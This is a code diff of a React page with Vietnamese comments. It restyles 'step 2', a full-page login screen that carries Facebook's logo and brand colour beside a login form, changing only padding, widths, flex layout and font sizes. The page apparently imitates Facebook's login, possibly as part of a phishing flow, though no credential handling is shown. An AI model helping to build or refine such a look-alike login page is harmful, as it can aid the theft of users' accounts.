@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% ảnh 1 */}
+              {/* BƯỚC 2: LOGIN FULL PAGE */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -740,39 +740,37 @@ export default function Home() {
                   flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Chứa logo, chữ và ảnh */}
+                  {/* CỘT TRÁI */}
                   <div style={{ 
                     flex: '2', 
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
-                    padding: '0 4vw',
+                    padding: '0 6vw', // Đẩy lề trái cho đẹp
                     borderRight: '1px solid #e4e6eb',
                     backgroundColor: '#fff'
                   }}>
                     
-                    {/* Khối bọc để căn lề trái tổng thể */}
-                    <div style={{ width: '100%', maxWidth: '800px', margin: '0 auto' }}>
+                    <div style={{ width: '100%', maxWidth: '900px', display: 'flex', flexDirection: 'column' }}>
                       
-                      {/* Logo Facebook trên cùng */}
+                      {/* Logo F trên cùng */}
                       <div style={{ marginBottom: '40px' }}>
-                        <svg viewBox="0 0 24 24" fill="#0866FF" width="48" height="48">
+                        <svg viewBox="0 0 24 24" fill="#0866FF" width="54" height="54">
                           <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
                         </svg>
                       </div>
 
-                      {/* Dùng Grid để chia 2 cột: Chữ và Ảnh nằm cạnh nhau */}
+                      {/* Chữ và Ảnh dàn ngang */}
                       <div style={{ 
-                        display: 'grid', 
-                        gridTemplateColumns: '1fr 1.5fr', // Chữ chiếm 1, Ảnh chiếm 1.5
-                        gap: '20px',
-                        alignItems: 'center' // Căn giữa theo chiều dọc
+                        display: 'flex', 
+                        alignItems: 'center', 
+                        gap: '40px' // Khoảng cách giữa chữ và ảnh
                       }}>
                         
-                        {/* CỘT CHỨA CHỮ */}
-                        <div>
+                        {/* Khối Chữ */}
+                        <div style={{ flex: '0 0 320px' }}>
                           <h1 style={{ 
-                            fontSize: '48px', 
+                            fontSize: '56px', 
                             fontWeight: '700', 
                             lineHeight: '1.1', 
                             color: '#1c2b33', 
@@ -784,8 +782,8 @@ export default function Home() {
                           </h1>
                         </div>
 
-                        {/* CỘT CHỨA ẢNH */}
-                        <div>
+                        {/* Khối Ảnh to */}
+                        <div style={{ flex: '1' }}>
                           <img 
                             src="/images/Anhlogin.webp" 
                             alt="Explore" 
@@ -797,7 +795,7 @@ export default function Home() {
                     </div>
                   </div>
 
-                  {/* CỘT PHẢI: Form đăng nhập (Giữ nguyên) */}
+                  {/* CỘT PHẢI: Form Đăng nhập */}
                   <div style={{ 
                     flex: '1',
                     display: 'flex', 
